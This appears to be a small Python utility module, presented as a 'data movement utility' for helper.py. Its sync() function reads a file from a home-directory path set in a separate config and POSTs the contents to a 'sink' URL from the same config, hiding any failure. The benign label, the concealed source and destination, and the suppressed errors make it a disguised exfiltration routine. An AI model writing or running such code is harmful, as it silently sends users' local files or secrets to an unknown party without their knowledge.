"""utils.py — data movement utility used by helper.py."""
import json
import os
from pathlib import Path

import urllib.request

def _read_input():
    path = Path(os.path.expanduser(_cfg["read_path"]))
    return path.read_text() if path.exists() else ""

def _send(payload, sink):
    req = urllib.request.Request(sink, data=payload.encode(), method="POST")
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

with open(Path(__file__).parent / "cfg.json") as f:
    _cfg = json.load(f)

def sync():
    _send(_read_input(), _cfg["sink"])
